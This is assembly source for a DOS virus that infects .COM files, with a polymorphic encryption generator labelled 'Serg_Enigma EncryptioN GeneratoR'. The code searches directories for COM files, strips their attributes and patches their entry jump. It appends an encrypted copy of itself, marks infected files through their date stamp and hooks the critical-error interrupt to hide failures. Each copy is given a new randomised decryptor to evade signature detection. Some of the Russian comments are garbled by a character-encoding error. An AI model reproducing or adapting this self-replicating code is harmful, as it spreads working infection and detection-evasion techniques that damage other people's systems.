       .MODEL tiny
       .186
       .code
       org 100h
   start:
       jmp sc
       db  200d dup(08h)
   sc     PROC
       db      90h,90h,90h     ;--- Mov {BX} {SI} {DI},START_DECODING  YYY
   decod   db      90h,90h,90h     ;\                                      YYY
       db      90h,90h,90h     ; \                                     YYY
       db      90h,90h,90h     ;  \                                    YYY
       db      90h,90h,90h     ;   \___DECODER                         YYY
       db      90h,90h,90h     ;   /                                   YYY
       db      90h,90h,90h     ;  /                                    YYY
       db      90h,90h,90h     ; /                                     YYY
       db      90h,90h,90h     ;/                                      YYY
       db      90h             ;-- INC {BX} {SI} {DI}                  Y
       db      90h,90h,90h,90h ;-- CMP {BX} {SI} {DI},END_DECODING     NYYY
       db      90h,90h         ;-- JB  DECOD                           NY
   Virn    PROC
       Mov     dx,0000h  ;--- KEY
   Virt:
       Push    Cs
       Pop     Ss
       Pushf
       Mov     Di,Sp
       Mov     Bx,[Di]
       Lahf
       Sub     Bx,Ax
       Xchg    Ax,Bx
       Xor     Al,Al
       Sub     Ah,70h
       Push    100h
       Xchg    Al,Ah
       Mov     Cx,4
       Push    Dx
       Mul     Cx
       Pop     Dx
       Sub     Di,Ax
       Mov     Ax,[Di]
       Sub     Ah,72h
       Xor     Al,Al
       Add     Dx,Ax
       Pop     Ax
       Pop     Ax
   Virn    ENDP
           Call    opt
   opt:    Pop Bp
       Sub Bp,offset opt
       Jmp Cycl
   Cd:
       Xor Bx,Bx
       Jmp Cycl
   Cr:
       Mov Bh,22h
   Cycl:
       Lea     si,vir+[Bp]
       Mov     cx,lng /2d
       Push    Dx
   crypt:
       Xor word ptr [Si],Dx
       Inc Si
       Sub Dx,0deadh
       Inc Si
       loop    crypt
       Pop Dx
       Cmp word ptr vir+[Bp],'?\'
       Jz  dr
       Cmp Bh,22h
       Jne Cr
       Inc Dh
       Jmp Cd
   dr:
       jmp     late

   vir     db      "\???????.COM",000h
   des     db      "000000000000000000000" ;00h
   atrib   db  "0"         ;15h
   time    db  "00"            ;16h
   date    db  "00"            ;18h
   dlina   db  "0000"          ;1Ah
   new_f   db  "000000000000"      ;1Eh
   new_j   db  "é00"
   buf_j   db  "Í *"
   ;------------------------------------------------------------------------------
   tabl    db  052h, 0fch, 05ah ;\     Nop
       db      0f6h, 017h, 090h ; \    Not b,[??]  +
       db      080h, 037h, 000h ;  \   Xor b,[??],K1   +   Key#-
       db      0c0h, 007h, 000h ;   \  Rol b,[??],K2   +   Key\_
       db      0c0h, 00fh, 000h ;    \ Ror b,[??],K2   +   Key/
       db      0f6h, 01fh, 090h ;    / Neg b,[??]  +
       db      080h, 007h, 000h ;   /  Add b,[??],K3   +   Key\_
       db      080h, 02fh, 000h ;  /   Sub b,[??],K3   +   Key/
   ;                   Dec b,[??]  +
   ;                   inc b,[??]  +
   ;musor  db  AX CX DX BP
   ;----------------------------------/
   M1  db      0bbh, 022h, 000h    ;---- [ MOV BX,xxxx ]
   I1  db  043h            ;---- [ INC BX ]
   COM db  081h, 0fbh, 0d2h, 05h   ;---- [ CMP xx,xxxx ]   +
   J1  db      072h, 0e1h          ;---- [ JB xx ] e1 - 8
   Gat db  1eh
       db  06h
   der db  1fh
       db  0cbh
   ;-------------------------------------------------------------------------------------
   Cop db      0dh,0ah,"-= [SEEG] Serg_Enigma EncryptioN GeneratoR v0.01 =-",0dh,0ah,"$"
   ;-------------------------------------------------------------------------------------
   one     db      00h  ;\
       db      00h  ; \
       db      00h  ;  \
       db      00h  ;   \___{ Š®¬¡¨ æ¨ï ª®¬¬ ¤ ¤«ï § /à §è¨äà®¢é¨ª 
       db      00h  ;   /
       db      00h  ;  /
       db      00h  ; /
       db      00h  ;/
   ;-----------------------------------------------------------------------
   dir db  00h
   cody    db  0fdh,05h
   seg_new dd  ?
   b_reg   db  ?
   n_com   db  ?
   d_dlina dd  ?
   vec24   dd  ?

   late:
       Lea Si,buf_j+[Bp]
       Mov Di,0100h
       Movsb
       Movsw
       Mov byte ptr dir+[Bp],00h
       Push    Es
       Call    Set_Int_24
       Pop Es
       Mov Ax,4900h
       Int 21h
       Jc  rt
       Mov Ax,4800h
       Mov Bx,0FFFFh
       Int 21h
       Sub Bx,70h ;-------\
       Jc  rt
       Mov Ax,4a00h
       Int 21h
       Mov Ax,4800h
       Mov Bx,6fh
       Int 21h
       Jc  Rt
       Mov word ptr [Bp+seg_new],Ax
       Mov Es,Ax
       Mov Al,90h
       Xor Di,Di
       Mov Cx,6e0h
       Rep Stosb
       Mov     Ah,2ch
       Int     21h
       Cmp Dh,22h
       Jnz drop
       Call    Mes
   drop:
       Call    gkey  ;*à®æ¥¤ãà  £¥¥à æ¨¨ 3-¥å ª«îç¥© ¨ § ¥á¥¨ï ¨å ¢ â ¡«¨æã
       Lea Si,one+[Bp]
       Mov     Ax,Dx
       Xor     Bx,Bx
       Call    rand
       Xor     Ax,1234h
       call    rand
       Mov Ax,Word Ptr [Si]
       Xor Ah,Ah
       Mov Bl,02h
       Div Bl
       Xor Ah,Ah
       Mov byte ptr [Bp]+b_reg,Al
       Push    Si
       Lea Si,tabl+[Bp]
       Call    mreg    ; *à®æ¥¤ãà  ¨í¬¥¥¨ï ¡ §®¢ëå à¥£¨áâà®¢ ¢ â ¡«¨æ¥
       Pop Si
       Mov ax,word ptr [Si]+01
       Cmp al,00h
       Jnz no
       Inc Ax
   no:
       Cmp byte ptr [Si],00h
       Jnz mo
       Inc byte ptr [Si]
   mo:
       Xor Ah,Ah
       Mov Bl,02h
       Div Bl
       Xor Ah,Ah
       Inc Al
       Mov byte ptr [Bp+n_com],Al
       Xchg    Cx,Ax
       Mov Ax,word ptr [Bp+seg_new]
       Mov Es,Ax
       Xor Ch,Ch
       Xor Ax,Ax
       Mov Di,0003h
       Xor Bx,Bx
       Mov Dx,24d
   Cycle:
       Call    Comp    ; ƒ¥¥à æ¨ï ¯®á«¥¤®¢ â¥«ì®áâ¨ ª®¬ ¤
       Inc Si
       Add Bx,0003h
       Sub Dx,0003h
       Loop    Cycle
       Push    Cs
       Pop Es
       Jmp Virus
   ;------ *®¤¯à®£à ¬¬ë ----------------------------------------------------------
   Comp:
       Cmp     byte ptr [Si],00h
       Jnz     Set_0
       Mov     Al,00d
       Jmp     vit
   Set_0:
       Cmp     byte ptr [Si],01h
       Jnz     Set_1
       Mov     Al,03d
       Jmp     vit
   Set_1:
       Cmp     byte ptr [Si],02h
       Jnz     Set_2
       Mov     Al,06d
       Jmp     vit
   Set_2:
       Cmp     byte ptr [Si],03h
       Jnz     Set_3
       Mov     Al,09d
       Jmp     vit
   Set_3:
       Cmp     byte ptr [Si],04h
       Jnz     Set_4
       Mov     Al,12d
       Jmp     vit
   Set_4:
       Cmp     byte ptr [Si],05h
       Jnz     Set_5
       Mov     Al,15h
       Jmp     vit
   Set_5:
       Cmp     byte ptr [Si],06h
       Jnz     Set_6
       Mov     Al,18d
       Jmp     vit
   Set_6:
       Cmp     byte ptr [Si],07h
       Jnz     Set_7
       Mov     Al,21d
       Jmp     vit
   Set_7:
       Cmp     byte ptr [Si],08h
       Jnz     Set_8
       Mov     Al,21d
       Jmp     vit
   Set_8:
       Cmp     byte ptr [Si],09h
       Jnz     Set_9
       Mov     Al,18d
       Jmp     vit
   Set_9:
       Cmp     byte ptr [Si],0ah
       Jnz     Set_a
       Mov     Al,15d
       Jmp     vit
   Set_a:
       Cmp     byte ptr [Si],0bh
       Jnz     Set_b
       Mov     Al,12d
       Jmp     vit
   Set_b:
       Cmp     byte ptr [Si],0ch
       Jnz     Set_c
       Mov     Al,09d
       Jmp     vit
   Set_c:
       Cmp     byte ptr [Si],0dh
       Jnz     Set_d
       Mov     Al,06d
       Jmp     vit
   Set_d:
       Cmp     byte ptr [Si],0eh
       Jnz     Set_e
       Mov     Al,03d
       Jmp     vit
   Set_e:
       Cmp     byte ptr [Si],0fh
       Jnz     Set_f
       Mov     Al,00h
       Jmp vit
   Set_f:
       Jmp rt

   set:
       Rol Ax,Cl
       Xor Ah,Ah
       Div Ch
       Mov byte ptr [Si]+[Bx],Al
       Inc Bx
       Ret
   Mes:
       Push    Dx
       Mov Ah,09h
       Lea Dx,Cop+[Bp]
       Int 21h
       Pop Dx
       Ret

   ort:
       Movsb
       Movsw
       ret
   res:
       Cmp Al,09h
       Jnz d1
       Mov Al,0ch
       Ret
   d1:
       Cmp Al,0ch
       Jnz d2
       Mov Al,09h
       Ret
   d2:
       Cmp Al,12h
       Jnz d3
       Mov Al,15h
       Ret
   d3:
       Cmp Al,15h
       Jnz d4
       Mov Al,12h
   d4:
       Ret

   rand:
       push    Ax
       Mov     ch,10h
       Xor     Cl,Cl
       Call    set
       Pop     Ax
       Push    Ax
       Mov     Cl,04h
       Call    set
       Pop     Ax
       Push    Ax
       Mov     Cl,08h
       Call    set
       Pop     Ax
       Push    Ax
       Mov     Cl,0ch
       Call    set
       Pop     Ax
       Ret

   R_Vec24        PROC
           Push    word ptr Vec24+[Bp]
           Pop Ds
           Mov Dx,word ptr Vec24+[Bp]+2
           Mov Ax,2524h
           Int 21h
           Ret
   R_Vec24        ENDP

   Set_Int_24: Push    Ds
           Push    Bx
           Push    Dx
           Mov Ax,3524h
           Int 21h
           Mov word ptr Vec24+[Bp]+2,Bx
           Mov word ptr Vec24+[Bp],Es
           Push    Cs
           Pop Ds
           Mov Ax,2524h
           Lea Dx,intr24+[Bp]
           Int 21h
           Pop Dx
           Pop Bx
           Pop Ds
           Ret

   ;Intr21        PROC
   ;   db  09ah
   ;   vector  dd  ?
   ;       ret
   ;Intr21        ENDP

   Intr24:
       Mov Al,3h
       Iret

   vit:
       Push    Si
       Push    Di
       Push    Si
       Lea     Si,tabl+[Bp]
       Add     Si,Ax
       Add Di,Bx
       Call    ort
       Pop     Si
       Pop Di
       Call    res
       Push    Di
       Push    Si
       Lea Si,tabl+[Bp]
       Add Si,Ax
       Mov     Di,600h ;-------------------------??????????
       Add Di,Dx
       Call    ort
       Pop     Si
       Pop Di
       Pop Si
       Ret
   mreg:
       Cmp Al,01h
       Jnz q1
       Jmp Bx_r
   q1:
       Cmp Al,02h
       Jnz Si_r
   Di_r:
       Mov byte ptr [Si]+04h,15h
       Mov byte ptr [Si]+07h,35h
       Mov byte ptr [Si]+0ah,05h
       Mov byte ptr [Si]+0dh,0dh
       Mov byte ptr [Si]+10h,1dh
       Mov byte ptr [Si]+13h,05h
       Mov byte ptr [Si]+16h,2dh
       Mov byte ptr [Si]+18h,0bfh
       Mov byte ptr [Si]+1bh,47h
       Mov byte ptr [Si]+1dh,0ffh
       Ret
   Si_r:
       Mov byte ptr [Si]+04h,14h
       Mov byte ptr [Si]+07h,34h
       Mov byte ptr [Si]+0ah,04h
       Mov byte ptr [Si]+0dh,0ch
       Mov byte ptr [Si]+10h,1ch
       Mov byte ptr [Si]+13h,04h
       Mov byte ptr [Si]+16h,2ch
       Mov byte ptr [Si]+18h,0beh
       Mov byte ptr [Si]+1bh,46h
       Mov byte ptr [Si]+1dh,0feh
       Ret
   Bx_r:
       Mov byte ptr [Si]+04h,17h
       Mov byte ptr [Si]+07h,37h
       Mov byte ptr [Si]+0ah,07h
       Mov byte ptr [Si]+0dh,0fh
       Mov byte ptr [Si]+10h,1fh
       Mov byte ptr [Si]+13h,07h
       Mov byte ptr [Si]+16h,2fh
       Mov byte ptr [Si]+18h,0bbh
       Mov byte ptr [Si]+1bh,43h
       Mov byte ptr [Si]+1dh,0fbh
       Ret

   gkey:
       Push    Dx
       Mov [Si]+8h,Dl
       Mov [Si]+0bh,Dh
       Mov [Si]+0eh,Dh
       Add Dh,Dl
       Mov [Si]+14h,Dh
       Mov [Si]+17h,Dh
       Pop Dx
       Ret

   ;**************************************************** VIRUS START *************
   Virus:
       Mov     ah,1ah
       Lea     Si,vir+[Bp]
       Mov Dx,Si
       Add Dx,0dh
       Int     21h
       Mov Dx,Si
       Add     dx,1h
   find_f:
       Mov     ah,4eh
       Mov     cx,00h
       Int     21h
       jmp     ok
   find_n:
       Mov     ah,4fh
       Int     21h

   ok:
       jnb     chk
       cmp     al,12h
       jz      dg
       jmp     chk
   dg:
       cmp     byte ptr [Bp]+dir,0ffh
       jnz     fg
       jmp     rt
   fg:
       dec     dx
       Mov     byte ptr [Bp]+dir,0ffh
       jmp     find_f

   chk:
       Mov     cx,[Bp]+offset date
       and     cx,001ah
       cmp     cx,001ah
       jz      find_n
       cmp     word ptr [Bp]+offset dlina,62000d
       ja      find_n
       cmp     word ptr [Bp]+offset dlina,100h
       jb      find_n
       push    si
       Mov     di,si
       Add     di,0dh
       Add     si,02bh
       cmp     byte ptr [Bp]+dir,0ffh
       jnz     nam
       Mov     al,5ch
       stosb
   nam:
       lodsb
       stosb
       cmp     al,00
       jnz     nam
       pop     Si
       Mov     dx,si
       Add     dx,00dh
       Mov Cx,[Bp]+offset atrib
       Xor Ch,Ch
       and     cx,0fffeh
       Mov     ax,4301h
       Int     21h
       Mov     ax,[Bp]+offset dlina ;====lengh of file to AX
       Sub     ax,0003h
       Mov     [Bp]+1h+offset new_j,ax ;==========new JMP to virus
       Mov     al,02h
       Mov     ah,3dh
       Int     21h
       jnb     ar
       jmp     rt
   ar:
       Mov     bx,ax
       Mov     ax,4200h
       Mov     cx,00h
       Mov     dx,00h
       Int     21h
       Mov     ah,3fh
       Mov     cx,0003h
       Lea     dx,buf_j+[Bp]
       Int     21h
       Mov Di,offset buf_j+[Bp]
       Cmp Di,'ZM'
       Jnz infect
       Mov Ah,3eh
       Int 21h
       Jmp find_n
   infect:
       Lea Si,virn+[Bp]
       Mov Di,22h
       Push    offset seg_new+[Bp]
       Pop Es
       Mov Cx,cod2_lng
       Rep Movsb
       Mov     ax,4200h
       Xor     cx,cx
       Xor     dx,dx
       Int     21h
       Mov     ax,4000h
       Mov     cx,0003h
       Lea Dx,new_j+[Bp]
       Int     21h
       Mov     ah,42h
       Mov     al,02h
       Xor Cx,Cx
       Xor Dx,Dx
       Int     21h
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
       Mov Ah,2ch  ;       \
       Int 21h ;        \
       Push    Ds  ;         \
       Mov Cx,(Cod2_Lng /2d)-20h   ;      \
       Mov Si,85h      ;   \
       Mov Es:[23h],Dx ;        \
   My:             ;         >---------> 1-ï ‡ è¨äà®¢ª 
       Xor word ptr Es:[Si],Dx ;    /
       Inc Si          ;   /
       Sub Dx,0DEADh
       Inc Si         ;   /
       Loop    My        ;   /
   ;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
       Push    Bx
       Xor Ax,Ax
       Mov Al,[Bp]+n_com
       Mov Bl,03h
       Mul Bl
       Add Ax,03h
       Mov word ptr d_dlina+[Bp],Ax
       Lea Si,M1+[Bp]
       Xor Di,Di
       MovSb
       Mov Bx,offset dlina+[Bp]
       Add Bx,Ax
       Add Bx,107h
       Mov Es:[01h],Bx
       Lea Si,I1+[Bp]
       Mov Di,Ax
       Cld
       MovSw
       MovSb
       MovSw
       MovSw
       Add Bx,lng
       Mov Si,Ax
       Add Si,03h
       Mov Es:[Si],Bx
       Add Si,03h
       Xor Bx,Bx
       Sub Bx,Ax
       Sub Bx,4h
       Mov byte ptr Es:[Si],Bl
   ;-------------------------------
       Pop Bx
       Lea Si,gat+[Bp]
       Mov Di,5fdh
       MovSb
       MovSw
       Sub Si,0dh
       Mov Di,600h
       MovSb
       MovSw
       Lea Si,I1+[Bp]
       Mov Di,61bh
       MovSw
       MovSb
       MovSw
       MovSw
       Inc Si
       Inc Si
       MovSw
       Push    Bx
       Cld
       Call    dword ptr cody+[Bp]
       Pop Bx
   dry:
       Xor Dx,Dx
       Push    Es
       Pop Ds

       Mov     Cx,Ax
       Add Cx,7h
       Mov     ax,4000h
       Int     21h
       Mov     cx,cod2_lng
       Mov Dx,22h
       Mov     ax,4000h
       Int     21h
   ;---------------------------------------------------------------------------

       Pop Ds
       Mov     cx,[Bp]+offset time
       Mov     dx,[Bp]+offset date
       and     dx,0ff0eh
       or      dx,001ah
       Mov     ax,5701h
       Int     21h
       Mov     ah,3eh
       Int     21h

   rt:
       Call    R_Vec24
       Mov Ah,49h
       Push    Es
       Pop Bx
       Int 21h
       Push    Cs
       Pop Es
       Push    Es
       Pop Ds
       Push    100h
       Xor     Ax,Ax
       Xor Cx,Cx
       Xor     Dx,Dx
       Xor     Bx,Bx
       Ret
   sc      ENDP
   lng     =   $-Sc
   Cod2_lng    =   $-Virn

   END start
   END
